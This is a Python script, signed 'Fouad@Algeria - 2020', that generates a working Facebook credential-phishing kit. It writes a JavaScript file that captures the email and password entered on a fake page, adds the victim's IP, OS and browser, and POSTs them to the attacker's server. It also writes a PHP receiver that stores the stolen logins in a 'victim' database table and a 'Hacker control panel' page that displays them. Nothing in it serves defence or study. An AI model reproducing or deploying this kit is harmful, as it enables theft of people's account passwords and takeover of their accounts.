import os

 
# This Code for javaScript for get some inforamtion and send data(user,password) in php code 
_js="""

function login()
{
	
    var user = document.getElementById('email').value;
    var pass = document.getElementById('pass').value;
    var os =checkOperatingSystem();
    var browser = getBrowser();

    fetch('https://ipapi.co/json/')
    .then(function(response) {
      return response.json();
    })
    .then(function(data) {
       if( user =='' || pass =='')
        {
            window.location.reload(true);
            return;
        }
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://@server/victim.php', true);
        xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        xhr.onload = function () {console.log(this.responseText); };
        xhr.send('user='+user+'&pass='+pass+'&ip='+data.ip+'&os='+os+'&browser='+browser);

        
    });
    
     

}


         // here som functions

         function getBrowser()
         {
           
         if (navigator.userAgent.search('MSIE') >= 0) {
            //code goes here
          //  console.log('browser is : MSIE');
            return 'MSIE';
         }
         else if (navigator.userAgent.search('Chrome') >= 0) {
             //code goes here
           //  console.log('browser is : Chrome');
             return 'Chrome';
         }
         else if (navigator.userAgent.search('Firefox') >= 0) {
             //code goes here
            // console.log('browser is : Firefox');
             return 'Firefox';
         }
         else if (navigator.userAgent.search('Safari') >= 0 && navigator.userAgent.search('Chrome') < 0) {
             //code goes here
           //  console.log('browser is : Safari');
             return 'Safari';
         }
         else if (navigator.userAgent.search('Opera') >= 0) {
             //code goes here
            // console.log('browser is : Opera');
             return 'opera';
         }
         }

         

         function checkOperatingSystem()
         {
             var  userAgent = navigator.userAgent || navigator.vendor || window.opera;
         
             //Check mobile device is Android
             if (/android/i.test(userAgent)) {
                 //Add your Code here
                 return 'android';
             }
         
             //Check mobile device is IOS
             if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
                 //Add your Code here
                 return 'iPhone or iPad';
             }
         
             //Check device os is Windows (For Laptop and PC)
             if (navigator.appVersion.indexOf('Win')!=-1)
             {
                 //Add your Code here
                 return 'Win';
             }
         
             //Check device os is MAC (For Laptop and PC)
             if (navigator.appVersion.indexOf('Mac')!=-1)
             {
                 //Add your Code here
                 return 'Mac'
             }  
         }
         


         function logininFirst()
         {
            document.getElementById('error').innerHTML='';
             i=4;
            var ti= setInterval(function()
            {
               i--;
                document.getElementById('email').focus();
              // document.getElementById('error').innerHTML='You cannot view more videos. Log in first.';
               if(i===0)
               {
                
                document.getElementById('email').focus();
                //document.getElementById('error').innerHTML='';
                  clearInterval(ti);
                  
                 
               }
              
             }, 1000);
           
            
            // alert("You cannot view more videos. Log in first.");
         }



"""






# This Code for php for post data (user,password) and insert to database in table victim
phpVictim = """

<?php
header('Access-Control-Allow-Origin: *');
$server       = '@server';
$username     = '@user';
$password     = '@pass';
$db           = 'sys_hacklink';
$con= mysqli_connect($server,$username,$password,$db,3306);



if($con){
   echo 'ok';
   if(isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['ip']) && isset($_POST['os']) && isset($_POST['browser']) )
    {
       $_user      = $_POST['user'];
       $pass       = $_POST['pass'];
       $ip         = $_POST['ip'];
       $os         = $_POST['os'];
       $browser    =$_POST['browser'];  
       $dateAccess = date('d /m /Y G:i:s');
       $insert ="INSERT INTO victim (user_facebook, pass_facebook, ip, os, browser, myTime)
                              VALUES ('$_user','$pass','$ip','$os','$browser','$dateAccess')";
        echo $insert;
        $result= mysqli_query($con,$insert);
        if($result)
        {
            // here some code warning from new Victim
            echo 'succuss';
        }
        else
        {
            echo 'no succuss';
        }
    }
}
else{
   echo 'error_con';
}
mysqli_close($con);
//echo 'close'

?>

"""


panle="""
<?php 
header('Access-Control-Allow-Origin: *');
$server       = '@server';
$username     = '@user';
$password     = '@pass';
$db           = 'sys_hacklink';
$con= mysqli_connect($server,$username,$password,$db);


?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
    <title>...HACKING...</title>
    <script src="main.js"></script>

    <style>
        body{text-align: center;font-size: 20px;background-color: black;color: red;}
         table{ border:solid yellow 1px ;margin-top: 5px;  }
        .ti{border:solid yellow .5px ;padding: 10px;text-decoration:underline;text-align: center;}
        .tdg{border:solid green .5px ; color:green; text-align: center;  padding: 10px;}
    </style>
</head>
<body>
     <div align="center" >
        <img src="https://miro.medium.com/max/3200/1*xzLpo2yiBOoeQdZ4NPeCJA.jpeg" width="100%" height="250px" >
         <h1 style="font-size: 50px;margin-left:-500px;margin-top: -200px;margin-bottom: 150px; color:blue" >Hacker control panel</h1>
         <div align="center" style="margin-top: 20px;margin-bottom: 20px" >
                

                <input id="txt" class="btn btn-primary" type="text" placeholder="username">
                <input  id="del" class="btn btn-primary" type="submit" value="Search">
                </form>
                <script>
                    document.getElementById('del').addEventListener('click',function () {
                        var txt=document.getElementById('txt').value;
                        if (txt == "")
                        {
                            document.getElementById('txt').focus();
                            //txt.focus();
                            //return;
                        }
                        else
                        {
                            alert('user='+'"'+txt+"'");
                             /* var xhr = new XMLHttpRequest();
                              xhr.open('POST', 'panel.php', true);
                              xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                              xhr.onload = function () {console.log(this.responseText); };
                              
                              xhr.send('user='+txt);*/
                        }
                        
                        
                    });
                    
                </script>
               
         </div>
         <table >
             <tr> 
                 <th style="text-decoration:underline;" colspan="7"><h1 style="color:red;margin-top: 5px;margin-bottom: 5px; text-align: center">Information Victim</h1></th>
             </tr>
             <tr >
                 <td class="ti" >ID       </td>
                 <td class="ti" >USERNAME </td>
                 <td class="ti" >PASSWORD </td>
                 <td class="ti" >IP       </td>
                 <td class="ti" >OS       </td>
                 <td class="ti" >BROWSER  </td>
                 <td class="ti" >DATE     </td>
                 
             </tr>

             
                 <?php
                  
                  if($con){
                   
                     $select = 'select * from victim';
                     $result = mysqli_query($con,$select);
                     if($result){
                         $id=0;
                         while($row =mysqli_fetch_array($result))
                         {
                            $id++;
                             echo '<tr id="'.$row['id'].'" ><form  method="post">';
                             echo '<td class="tdg" style="display: none">'. $row['id'].'</td>'; 
                             echo '<td class="tdg">'. $id.'</td>'; 
                             echo '<td class="tdg">'. $row['user_facebook'].'</td>';
                             echo '<td class="tdg">'. $row['pass_facebook'].'</td>';
                             echo '<td class="tdg">'. $row['ip'].'</td>'; 
                             echo '<td class="tdg">'. $row['os'].'</td>'; 
                             echo '<td class="tdg">'. $row['browser'].'</td>'; 
                             echo '<td class="tdg">'. $row['myTime'].'</td>'; 
                             #echo '<td class="tdg"><input type="submit" name="del" value="DELETE" style="color:red; background-color: blue"></td>'; 
                             
                             echo '</form></tr>';
                         }
                         mysqli_close($con);
                     }
                  }
                  else
                  {

                    echo '<h1>connection Close </h1>';
                  }
                
                 


                  if(isset($_POST['user']))
                  {
                      echo $_POST['user'];
                      $del= 'DELETE FROM victim WHERE user_facebook='.$_POST['user'];
                      $result=mysqli_query($con,$del);
                      if($result)
                      {
                        echo ' deleted';
                      }
                      else{
                          echo 'non deleted';
                      }
                  }
                 ?>
                
            
                 

         </table>
         
          <br>
          <h1>By Fouad@Algeria - 2020</h1>
     </div>
     <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
</body>
</html>


"""







def create_and_copy_Files_Code (Di_path ,server, user,passwd):
    jscode = _js.replace('@server',server) # javascript change Server redirect
    phpcodeVS = phpVictim.replace('@server',server)
    phpcodeVU = phpcodeVS.replace('@user',user)
    phpcodeVP =phpcodeVU.replace('@pass',passwd)

    phpcodeVS1 = panle.replace('@server',server)
    phpcodeVU1 = phpcodeVS1.replace('@user',user)
    phpcodeVP1 =phpcodeVU1.replace('@pass',passwd)

  
    #print(phpcodeVP1)

    

    if not os.path.exists(Di_path+'/main.js'):
        js= open(Di_path+'/main.js','w+')
        js.write(jscode)
        js.close()
    if not os.path.exists(Di_path+'/victim.php'):
        phpv= open(Di_path+'/victim.php','w+')
        phpv.write(phpcodeVP)
        phpv.close()
    if not os.path.exists(Di_path+'/panel.php.php'):
        phph= open(Di_path+'/panel.php','w+')
        phph.write(phpcodeVP1)
        phph.close() 





        
        

#create_and_copy_Files_Code ('C:/xampp/htdocs/Facebook-videos' ,'localhost','root','')

        
